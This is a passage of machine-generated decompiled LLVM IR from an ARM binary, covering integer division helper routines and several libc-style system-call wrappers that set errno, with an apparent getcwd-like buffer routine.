  %v4_cc8c = mul i32 %v0_cc98.pr40, 16
  br i1 %v3_cc8c, label %bb88, label %dec_label_pc_cc98.loopexit

bb88:                                             ; preds = %bb87
  %v2_cc90 = and i32 %v1_cc90, 268435456
  %v3_cc90 = icmp eq i32 %v2_cc90, 0
  %v4_cc90 = mul i32 %v1_cc90, 16
  br i1 %v3_cc90, label %.preheader, label %dec_label_pc_cc98thread-pre-split.loopexit.loopexit

dec_label_pc_cc98thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_cca452.ph = phi i32 [ %v1_cc90, %bb86 ], [ %v4_cc90, %bb88 ]
  %v0_cc98.pr42.ph = phi i32 [ %v0_cc98.pr40, %bb86 ], [ %v4_cc8c, %bb88 ]
  br label %dec_label_pc_cc98thread-pre-split.loopexit

dec_label_pc_cc98thread-pre-split.loopexit:       ; preds = %dec_label_pc_cc98thread-pre-split.loopexit.loopexit, %.thread3
  %v1_cca452 = phi i32 [ %v1_cc90, %.thread3 ], [ %v1_cca452.ph, %dec_label_pc_cc98thread-pre-split.loopexit.loopexit ]
  %v0_cc98.pr42 = phi i32 [ %v0_cc98.pr40, %.thread3 ], [ %v0_cc98.pr42.ph, %dec_label_pc_cc98thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_cc98thread-pre-split

dec_label_pc_cc98thread-pre-split:                ; preds = %dec_label_pc_cc98thread-pre-split.loopexit, %bb90
  %v1_cca450 = phi i32 [ %v1_cca452, %dec_label_pc_cc98thread-pre-split.loopexit ], [ %v3_cca4, %bb90 ]
  %v2_cc9c48 = phi i32 [ %v0_cd50, %dec_label_pc_cc98thread-pre-split.loopexit ], [ %v2_cc9c, %bb90 ]
  %v0_cc98.pr = phi i32 [ %v0_cc98.pr42, %dec_label_pc_cc98thread-pre-split.loopexit ], [ %v3_cca0, %bb90 ]
  br label %dec_label_pc_cc98

dec_label_pc_cc98.loopexit:                       ; preds = %bb87
  br label %dec_label_pc_cc98

dec_label_pc_cc98:                                ; preds = %dec_label_pc_cc98.loopexit, %dec_label_pc_cc98thread-pre-split
  %v1_cca4 = phi i32 [ %v1_cca450, %dec_label_pc_cc98thread-pre-split ], [ %v1_cc90, %dec_label_pc_cc98.loopexit ]
  %v2_cc9c = phi i32 [ %v2_cc9c48, %dec_label_pc_cc98thread-pre-split ], [ %v0_cd50, %dec_label_pc_cc98.loopexit ]
  %v1_cca0 = phi i32 [ %v0_cc98.pr, %dec_label_pc_cc98thread-pre-split ], [ %v4_cc8c, %dec_label_pc_cc98.loopexit ]
  %v2_cc98 = icmp slt i32 %v1_cca0, 0
  br i1 %v2_cc98, label %dec_label_pc_ccac, label %bb89

bb89:                                             ; preds = %dec_label_pc_cc98
  %v4_cc9c = icmp ult i32 %v1_cca0, %v2_cc9c
  br i1 %v4_cc9c, label %bb90, label %dec_label_pc_ccac

bb90:                                             ; preds = %bb89
  %v3_cca0 = mul i32 %v1_cca0, 2
  %v2_cca4 = icmp slt i32 %v1_cca4, 0
  %v3_cca4 = mul i32 %v1_cca4, 2
  br i1 %v2_cca4, label %dec_label_pc_ccac, label %dec_label_pc_cc98thread-pre-split

dec_label_pc_ccac:                                ; preds = %bb89, %dec_label_pc_cc98, %bb90
  %v2_ccb863 = phi i32 [ %v3_cca4, %bb90 ], [ %v1_cca4, %bb89 ], [ %v1_cca4, %dec_label_pc_cc98 ]
  %v1_ccb055 = phi i32 [ %v3_cca0, %bb90 ], [ %v1_cca0, %bb89 ], [ %v1_cca0, %dec_label_pc_cc98 ]
  br label %dec_label_pc_ccb0

dec_label_pc_ccb0:                                ; preds = %.thread13, %dec_label_pc_ccac
  %v1_cce4 = phi i32 [ %v4_cce4, %.thread13 ], [ %v2_ccb863, %dec_label_pc_ccac ]
  %v1_ccb8 = phi i32 [ %v1_ccf4, %.thread13 ], [ 0, %dec_label_pc_ccac ]
  %v1_cce8 = phi i32 [ %v4_cce8, %.thread13 ], [ %v1_ccb055, %dec_label_pc_ccac ]
  %v1_ccb4 = phi i32 [ %v0_cce0, %.thread13 ], [ %v0_cd50, %dec_label_pc_ccac ]
  %v3_ccb0 = icmp ult i32 %v1_ccb4, %v1_cce8
  br i1 %v3_ccb0, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_ccb0
  %v3_ccb4 = sub i32 %v1_ccb4, %v1_cce8
  %v3_ccb8 = or i32 %v1_ccb8, %v1_cce4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_ccb0, %bb91
  %v1_ccc0 = phi i32 [ %v1_ccb4, %dec_label_pc_ccb0 ], [ %v3_ccb4, %bb91 ]
  %v1_ccc4 = phi i32 [ %v1_ccb8, %dec_label_pc_ccb0 ], [ %v3_ccb8, %bb91 ]
  %v4_ccbc = udiv i32 %v1_cce8, 2
  %v6_ccbc = icmp ult i32 %v1_ccc0, %v4_ccbc
  br i1 %v6_ccbc, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_ccc0 = urem i32 %v1_cce8, 2
  %v4_ccc0 = icmp eq i32 %v3_ccc0, 0
  %v6_ccc0 = sub i32 %v1_ccc0, %v4_ccbc
  br i1 %v4_ccc0, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_ccc4 = udiv i32 %v1_cce4, 2
  %v6_ccc4 = or i32 %v1_ccc4, %v5_ccc4
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_cccc = phi i32 [ %v6_ccc0, %bb92 ], [ %v1_ccc0, %.thread8 ], [ %v6_ccc0, %bb93 ]
  %v1_ccd0 = phi i32 [ %v1_ccc4, %bb92 ], [ %v1_ccc4, %.thread8 ], [ %v6_ccc4, %bb93 ]
  %v4_ccc8 = udiv i32 %v1_cce8, 4
  %v6_ccc8 = icmp ult i32 %v1_cccc, %v4_ccc8
  br i1 %v6_ccc8, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_cccc = and i32 %v1_cce8, 2
  %v4_cccc = icmp eq i32 %v3_cccc, 0
  %v6_cccc = sub i32 %v1_cccc, %v4_ccc8
  br i1 %v4_cccc, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_ccd0 = udiv i32 %v1_cce4, 4
  %v6_ccd0 = or i32 %v1_ccd0, %v5_ccd0
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_ccd8 = phi i32 [ %v6_cccc, %bb94 ], [ %v1_cccc, %.thread9 ], [ %v6_cccc, %bb95 ]
  %v1_ccdc = phi i32 [ %v1_ccd0, %bb94 ], [ %v1_ccd0, %.thread9 ], [ %v6_ccd0, %bb95 ]
  %v4_ccd4 = udiv i32 %v1_cce8, 8
  %v6_ccd4 = icmp ult i32 %v1_ccd8, %v4_ccd4
  br i1 %v6_ccd4, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_ccd8 = and i32 %v1_cce8, 4
  %v4_ccd8 = icmp eq i32 %v3_ccd8, 0
  %v6_ccd8 = sub i32 %v1_ccd8, %v4_ccd4
  br i1 %v4_ccd8, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_ccdc = udiv i32 %v1_cce4, 8
  %v6_ccdc = or i32 %v1_ccdc, %v5_ccdc
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_ccf4 = phi i32 [ %v1_ccdc, %bb96 ], [ %v1_ccdc, %.thread10 ], [ %v6_ccdc, %bb97 ]
  %v0_cce0 = phi i32 [ %v6_ccd8, %bb96 ], [ %v1_ccd8, %.thread10 ], [ %v6_ccd8, %bb97 ]
  %v2_cce0 = icmp eq i32 %v0_cce0, 0
  br i1 %v2_cce0, label %dec_label_pc_ccf0, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_cce4, 16
  br i1 %tmp, label %dec_label_pc_ccf0, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_cce4 = udiv i32 %v1_cce4, 16
  %v4_cce8 = udiv i32 %v1_cce8, 16
  br label %dec_label_pc_ccb0

dec_label_pc_ccf0:                                ; preds = %thread-pre-split12, %bb98
  %v1_ccf0 = icmp slt i32 %v2_cc48, 0
  br i1 %v1_ccf0, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_ccf0
  %v2_ccf4 = sub i32 0, %v1_ccf4
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_ccfc, %dec_label_pc_ccf0, %bb99
  %v1_ccf8 = phi i32 [ %v1_ccf4, %dec_label_pc_ccf0 ], [ %v2_ccf4, %bb99 ], [ %v2_cd00, %bb100 ], [ undef, %dec_label_pc_ccfc ], [ %v1_cd1480, %bb102 ], [ %v2_cd10, %bb103 ]
  ret i32 %v1_ccf8

dec_label_pc_ccfc:                                ; preds = %thread-pre-split
  br i1 %v1_cc44, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_ccfc
  %v2_cd00 = sub i32 0, %v0_cc48
  br label %.thread16

dec_label_pc_cd08:                                ; preds = %bb85
  br i1 %v3_cc64, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_cd08
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_cd08, %bb101
  %v1_cd1480 = phi i32 [ %v0_cc48, %dec_label_pc_cd08 ], [ 0, %bb101 ]
  br i1 %v9_cc64, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_cd0c = ashr i32 %v2_cc48, 31
  %v2_cd10 = or i32 %v4_cd0c, 1
  br label %.thread16

dec_label_pc_cd18:                                ; preds = %dec_label_pc_cc6c
  %v2_cd18 = icmp ugt i32 %v1_cd1c, 65535
  br i1 %v2_cd18, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_cd18
  %v2_cd1c = and i32 %v1_cd1c, 32768
  %v3_cd1c = icmp eq i32 %v2_cd1c, 0
  %v4_cd1c = udiv i32 %v1_cd1c, 65536
  br i1 %v3_cd1c, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_cd18
  %v0_cd2870 = phi i32 [ %v1_cd1c, %dec_label_pc_cd18 ], [ %v4_cd1c, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_cd2c = phi i32 [ %v0_cd2870, %.thread19 ], [ %v4_cd1c, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_cd28 = icmp ugt i32 %v1_cd2c, 255
  br i1 %v2_cd28, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_cd2c = and i32 %v1_cd2c, 128
  %v3_cd2c = icmp eq i32 %v2_cd2c, 0
  %v4_cd2c = udiv i32 %v1_cd2c, 256
  br i1 %v3_cd2c, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_cd30 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
  %v1_cd3c = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_cd30, %bb107 ]
  %v1_cd38 = phi i32 [ %v1_cd2c, %bb105 ], [ %v4_cd2c, %bb106 ], [ %v4_cd2c, %bb107 ]
  %v2_cd34 = icmp ugt i32 %v1_cd38, 15
  br i1 %v2_cd34, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_cd38 = and i32 %v1_cd38, 8
  %v3_cd38 = icmp eq i32 %v2_cd38, 0
  %v4_cd38 = udiv i32 %v1_cd38, 16
  br i1 %v3_cd38, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_cd3c = add nsw i32 %v1_cd3c, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_cd44 = phi i32 [ %v1_cd3c, %.thread20 ], [ %v1_cd3c, %bb108 ], [ %v2_cd3c, %bb109 ]
  %v5_cd48 = phi i32 [ %v1_cd38, %.thread20 ], [ %v4_cd38, %bb108 ], [ %v4_cd38, %bb109 ]
  %v2_cd40 = icmp ugt i32 %v5_cd48, 3
  %v7_cd40 = icmp eq i32 %v5_cd48, 4
  %v2_cd44 = xor i1 %v7_cd40, true
  %v3_cd44 = and i1 %v2_cd40, %v2_cd44
  br i1 %v3_cd44, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_cd44 = add nsw i32 %v4_cd44, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_cd48 = phi i32 [ %v4_cd44, %.thread21 ], [ %v5_cd44, %bb110 ]
  %v2_cd48 = xor i1 %v2_cd40, true
  %v3_cd48 = or i1 %v7_cd40, %v2_cd48
  br i1 %v3_cd48, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_cd48 = udiv i32 %v5_cd48, 2
  %v9_cd48 = add i32 %v4_cd48, %v8_cd48
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_cd50 = phi i32 [ %v4_cd48, %bb111 ], [ %v9_cd48, %bb112 ]
  %v1_cd4c = icmp slt i32 %v2_cc48, 0
  %v6_cd50 = lshr i32 %v0_cd50, %v1_cd50
  %v2_cd54 = sub i32 0, %v6_cd50
  %v2_cd54.v6_cd50 = select i1 %v1_cd4c, i32 %v2_cd54, i32 %v6_cd50
  ret i32 %v2_cd54.v6_cd50

dec_label_pc_cd5c:                                ; preds = %dec_label_pc_cc44
  %v0_cd5c = load i32, i32* @lr, align 4
  %v0_cd60 = call i32 @function_cd88()
  store i32 %v0_cd5c, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_cd48, { 1, 0 }
  uselistorder i1 %v7_cd40, { 1, 0 }
  uselistorder i32 %v4_cd38, { 1, 0 }
  uselistorder i32 %v1_cd38, { 1, 0, 2, 3 }
  uselistorder i32 %v4_cd2c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_cd2c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_cd1c, { 1, 0 }
  uselistorder i32 %v0_cce0, { 1, 0 }
  uselistorder i32 %v4_ccd4, { 1, 0 }
  uselistorder i32 %v1_ccdc, { 1, 2, 0 }
  uselistorder i32 %v4_ccc8, { 1, 0 }
  uselistorder i32 %v1_ccd0, { 1, 2, 0 }
  uselistorder i32 %v4_ccbc, { 1, 0 }
  uselistorder i32 %v1_ccc4, { 1, 2, 0 }
  uselistorder i32 %v1_cce8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_ccb8, { 1, 0 }
  uselistorder i32 %v1_cce4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_cca4, { 1, 0 }
  uselistorder i32 %v3_cca0, { 1, 0 }
  uselistorder i32 %v1_cca0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_cc9c, { 1, 0 }
  uselistorder i32 %v1_cca4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_cc90, { 1, 0 }
  uselistorder i32 %v4_cc8c, { 2, 1, 0 }
  uselistorder i32 %v1_cc90, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_cc98.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_cc64, { 1, 0 }
  uselistorder i32 %v1_cd1c, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_cc48, { 1, 0, 2 }
  uselistorder i32 %v0_cc48, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_cc44, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_cd88, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_ccf0, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_ccac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cc98thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_cd70(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cd70:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_cd74 = call i32 @function_cc44()
  ret i32 %v0_cd74
}

define i32 @function_cd88() local_unnamed_addr {
dec_label_pc_cd88:
  %v1_cd90 = call i32 @function_1007c(i32 8)
  ret i32 %v1_cd90
}

define i32 @function_cd9c() local_unnamed_addr {
dec_label_pc_cd9c:
  %v1_cdac = load i32, i32* @r0, align 4
  ret i32 %v1_cdac
}

define i32 @function_cdb0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cdb0:
  %v3_cdb0 = load i32, i32* @r4, align 4
  %v6_cdb0 = load i32, i32* @r5, align 4
  %v9_cdb0 = load i32, i32* @r6, align 4
  %v12_cdb0 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_cdb4 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_cdc4 = icmp eq i32 %arg1, 0
  br i1 %v2_cdb4, label %dec_label_pc_cdc4, label %dec_label_pc_cdf4

dec_label_pc_cdc4:                                ; preds = %dec_label_pc_cdb0
  br i1 %v2_cdc4, label %dec_label_pc_cde0, label %dec_label_pc_cdcc

dec_label_pc_cdcc:                                ; preds = %dec_label_pc_cdc4
  %v0_cdcc = call i32 @function_d0ec()
  %v0_cdd0 = load i32, i32* @r6, align 4
  store i32 %v0_cdd0, i32* @r4, align 4
  %v2_cdd8 = inttoptr i32 %v0_cdcc to i32*
  store i32 22, i32* %v2_cdd8, align 4
  br label %dec_label_pc_ce8c

dec_label_pc_cde0:                                ; preds = %dec_label_pc_cdc4
  %v0_cde0 = call i32 @function_ce9c()
  %v5_cde8 = icmp slt i32 %v0_cde0, 4096
  br i1 %v5_cde8, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_cde0
  store i32 %v0_cde0, i32* @r7, align 4
  br label %dec_label_pc_ce04

bb16:                                             ; preds = %dec_label_pc_cde0
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_ce04

dec_label_pc_cdf4:                                ; preds = %dec_label_pc_cdb0
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_cdc4, label %dec_label_pc_ce04, label %bb17

bb17:                                             ; preds = %dec_label_pc_cdf4
  br label %dec_label_pc_ce18

dec_label_pc_ce04:                                ; preds = %dec_label_pc_cdf4, %bb, %bb16
  %v0_ce04 = phi i32 [ %v0_cde0, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_cdf4 ]
  %v1_ce08 = call i32 @function_10110(i32 %v0_ce04)
  %v2_ce0c = icmp eq i32 %v1_ce08, 0
  br i1 %v2_ce0c, label %dec_label_pc_ce88, label %dec_label_pc_ce14

dec_label_pc_ce14:                                ; preds = %dec_label_pc_ce04
  br label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %bb17, %dec_label_pc_ce14
  %storemerge = phi i32 [ %arg1, %bb17 ], [ %v1_ce08, %dec_label_pc_ce14 ]
  %v0_ce5c = phi i32 [ %arg1, %bb17 ], [ %v1_ce08, %dec_label_pc_ce14 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 %v0_ce5c, i32* @r7, align 4
  %tmp = icmp ult i32 %v0_ce5c, -4095
  br i1 %tmp, label %dec_label_pc_ce44, label %dec_label_pc_ce34

dec_label_pc_ce34:                                ; preds = %dec_label_pc_ce18
  %v0_ce34 = call i32 @function_d0ec()
  %v0_ce38 = load i32, i32* @r7, align 4
  %v1_ce38 = sub i32 0, %v0_ce38
  %v2_ce3c = inttoptr i32 %v0_ce34 to i32*
  store i32 %v1_ce38, i32* %v2_ce3c, align 4
  br label %dec_label_pc_ce74

dec_label_pc_ce44:                                ; preds = %dec_label_pc_ce18
  %v1_ce44 = icmp slt i32 %v0_ce5c, 0
  br i1 %v1_ce44, label %dec_label_pc_ce74, label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_ce44
  %v0_ce4c = load i32, i32* @r4, align 4
  %v2_ce4c = icmp eq i32 %v0_ce4c, 0
  br i1 %v2_ce4c, label %bb18, label %dec_label_pc_ce68.thread7

dec_label_pc_ce68.thread7:                        ; preds = %dec_label_pc_ce4c
  br label %dec_label_pc_ce8c

bb18:                                             ; preds = %dec_label_pc_ce4c
  %v1_ce50 = load i32, i32* @r6, align 4
  %v3_ce50 = icmp eq i32 %v1_ce50, 0
  br i1 %v3_ce50, label %dec_label_pc_ce68, label %dec_label_pc_ce68.thread

dec_label_pc_ce68.thread:                         ; preds = %bb18
  br label %bb19

dec_label_pc_ce68:                                ; preds = %bb18
  %v2_ce60 = inttoptr i32 %v0_ce5c to i32*
  %v3_ce60 = call i32 @function_10a30(i32* %v2_ce60, i32 %v0_ce5c)
  store i32 %v3_ce60, i32* @r4, align 4
  %v2_ce68 = icmp eq i32 %v3_ce60, 0
  br i1 %v2_ce68, label %dec_label_pc_ce68.bb19_crit_edge, label %dec_label_pc_ce8c

dec_label_pc_ce68.bb19_crit_edge:                 ; preds = %dec_label_pc_ce68
  %v1_ce6c.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_ce68.bb19_crit_edge, %dec_label_pc_ce68.thread
  %v1_ce6c = phi i32 [ %v1_ce6c.pre, %dec_label_pc_ce68.bb19_crit_edge ], [ %v0_ce5c, %dec_label_pc_ce68.thread ]
  store i32 %v1_ce6c, i32* @r4, align 4
  br label %dec_label_pc_ce8c

dec_label_pc_ce74:                                ; preds = %dec_label_pc_ce44, %dec_label_pc_ce34
  %v0_ce74 = load i32, i32* @r4, align 4
  %v2_ce74 = icmp eq i32 %v0_ce74, 0
  br i1 %v2_ce74, label %dec_label_pc_ce7c, label %dec_label_pc_ce88

dec_label_pc_ce7c:                                ; preds = %dec_label_pc_ce74
  %v0_ce7c = load i32, i32* @r5, align 4
  store i32 %v0_ce7c, i32* @r0, align 4
  %v0_ce80 = call i32 @function_11048()
  br label %dec_label_pc_ce8c

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce74, %dec_label_pc_ce04
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_ce68.thread7, %bb19, %dec_label_pc_ce68, %dec_label_pc_ce7c, %dec_label_pc_cdcc, %dec_label_pc_ce88
  %v0_ce8c = load i32, i32* @r4, align 4
  store i32 %v3_cdb0, i32* @r4, align 4
  store i32 %v6_cdb0, i32* @r5, align 4
  store i32 %v9_cdb0, i32* @r6, align 4
  store i32 %v12_cdb0, i32* @r7, align 4
  ret i32 %v0_ce8c

; uselistorder directives
  uselistorder i32 %v0_ce5c, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v1_ce08, { 1, 0, 2 }
  uselistorder i32 %v0_cde0, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_ce8c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_ce18, { 1, 0 }
  uselistorder label %dec_label_pc_ce04, { 0, 2, 1 }
}

define i32 @function_ce9c() local_unnamed_addr {
dec_label_pc_ce9c:
  %v4_cea8 = load i32, i32* inttoptr (i32 143060 to i32*), align 4
  %v1_ceac = inttoptr i32 %v4_cea8 to i32*
  %v2_ceac = load i32, i32* %v1_ceac, align 4
  %v2_ceb0 = icmp eq i32 %v2_ceac, 0
  br i1 %v2_ceb0, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_ce9c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_ce9c, %bb
  %v1_ceb8 = phi i32 [ %v2_ceac, %dec_label_pc_ce9c ], [ 4096, %bb ]
  ret i32 %v1_ceb8

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_cec4() local_unnamed_addr {
dec_label_pc_cec4:
  %v1_ced4 = load i32, i32* @r0, align 4
  ret i32 %v1_ced4
}

define i32 @function_ced8(i32* %arg1) local_unnamed_addr {
dec_label_pc_ced8:
  %stack_var_-16 = alloca i32, align 4
  %v2_cedc = ptrtoint i32* %stack_var_-16 to i32
  %v2_ceec = call i32 @function_cfcc(i32 %v2_cedc, i32 0)
  %v2_cef0 = load i32, i32* %stack_var_-16, align 4
  %v2_cef4 = icmp eq i32* %arg1, null
  br i1 %v2_cef4, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_ced8
  store i32 %v2_cef0, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_ced8, %bb
  ret i32 %v2_cef0

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_cf08() local_unnamed_addr {
dec_label_pc_cf08:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cf08 = load i32, i32* @r7, align 4
  store i32 %v3_cf08, i32* %stack_var_-8, align 4
  %v0_cf14 = load i32, i32* @r0, align 4
  store i32 %v0_cf14, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cf14, -4095
  br i1 %tmp, label %dec_label_pc_cf34, label %dec_label_pc_cf24

dec_label_pc_cf24:                                ; preds = %dec_label_pc_cf08
  %v0_cf24 = call i32 @function_d0ec()
  %v0_cf28 = load i32, i32* %r7.global-to-local, align 4
  %v1_cf28 = sub i32 0, %v0_cf28
  %v2_cf2c = inttoptr i32 %v0_cf24 to i32*
  store i32 %v1_cf28, i32* %v2_cf2c, align 4
  %v2_cf34.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cf34

dec_label_pc_cf34:                                ; preds = %dec_label_pc_cf08, %dec_label_pc_cf24
  %v1_cf38 = phi i32 [ %v0_cf14, %dec_label_pc_cf08 ], [ -1, %dec_label_pc_cf24 ]
  %v2_cf34 = phi i32 [ %v3_cf08, %dec_label_pc_cf08 ], [ %v2_cf34.pre, %dec_label_pc_cf24 ]
  store i32 %v2_cf34, i32* @r7, align 4
  ret i32 %v1_cf38

; uselistorder directives
  uselistorder i32 %v0_cf14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cf34, { 1, 0 }
}

define i32 @function_cf3c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cf3c:
  %v0_cf48 = call i32 @function_12ac0()
  ret i32 %v0_cf48
}

define i32 @function_cf58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_cf58:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_cf88, label %dec_label_pc_cf78

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cf58
  %v0_cf78 = call i32 @function_d0ec()
  %v0_cf7c = load i32, i32* %r4.global-to-local, align 4
  %v1_cf7c = sub i32 0, %v0_cf7c
  %v2_cf80 = inttoptr i32 %v0_cf78 to i32*
  store i32 %v1_cf7c, i32* %v2_cf80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cf88

dec_label_pc_cf88:                                ; preds = %dec_label_pc_cf58, %dec_label_pc_cf78
  %v0_cf88 = phi i32 [ %arg1, %dec_label_pc_cf58 ], [ -1, %dec_label_pc_cf78 ]
  ret i32 %v0_cf88

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cf88, { 1, 0 }
}

define i32 @function_cf98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cf98:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cf98 = load i32, i32* @r7, align 4
  store i32 %v3_cf98, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_cfc0, label %dec_label_pc_cfb0

dec_label_pc_cfb0:                                ; preds = %dec_label_pc_cf98
  %v0_cfb0 = call i32 @function_d0ec()
  %v0_cfb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_cfb4 = sub i32 0, %v0_cfb4
  store i32 %v1_cfb4, i32* @r3, align 4
  %v2_cfb8 = inttoptr i32 %v0_cfb0 to i32*
  store i32 %v1_cfb4, i32* %v2_cfb8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_cfc4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cfc0

dec_label_pc_cfc0:                                ; preds = %dec_label_pc_cf98, %dec_label_pc_cfb0
  %v2_cfc4 = phi i32 [ %v3_cf98, %dec_label_pc_cf98 ], [ %v2_cfc4.pre, %dec_label_pc_cfb0 ]
  %v0_cfc0 = phi i32 [ %arg1, %dec_label_pc_cf98 ], [ -1, %dec_label_pc_cfb0 ]
  store i32 %v2_cfc4, i32* @r7, align 4
  ret i32 %v0_cfc0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cfc0, { 1, 0 }
}

